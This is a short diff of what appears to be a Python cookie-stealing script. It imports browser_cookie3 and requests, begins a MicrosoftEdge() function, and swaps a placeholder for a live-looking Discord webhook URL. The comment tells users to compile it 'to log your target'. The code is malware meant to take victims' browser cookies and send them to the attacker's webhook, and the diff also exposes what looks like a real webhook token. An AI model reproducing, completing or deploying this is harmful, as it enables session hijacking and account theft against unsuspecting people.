@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading
 
-WebHook = "INPUT_HERE" # Input your webhook here and make sure to compile if you want to log your target
+WebHook = "https://discord.com/api/webhooks/1155640784763240478/ArSjHcyEmqdsXnI3hVZOnU8AUZPQ60QuttiP5__zdGw5Y3aEy3o8_ra7EY4RmRqnUBTl" # Input your webhook here and make sure to compile if you want to log your target
 
 def MicrosoftEdge():
     try:
